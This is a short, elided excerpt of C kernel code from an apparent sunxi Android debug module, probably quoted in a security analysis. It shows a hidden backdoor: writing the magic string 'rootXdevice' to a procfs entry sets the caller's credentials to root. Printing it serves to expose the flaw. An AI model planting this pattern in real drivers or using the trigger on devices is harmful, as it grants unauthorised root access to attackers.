 ...
 unsigned long count, void *data)
{
	...
	if(!strncmp("rootXdevice",(char*)buf,12)){
		...
		cred->fsuid = 0;
		cred->fsgid = 0;
		printk("Your Android Device is now rooted.\n");
	}
...
static int sunxi_debug_init(void)
{
	...
	printk("rootXdevice: sunxi_root_procfs_attach ret:%d\n", ret);
	if(ret){
		printk("rootXdevice: sunxi_root_procfs_attach failed\n ");
	}
	return ret;
}
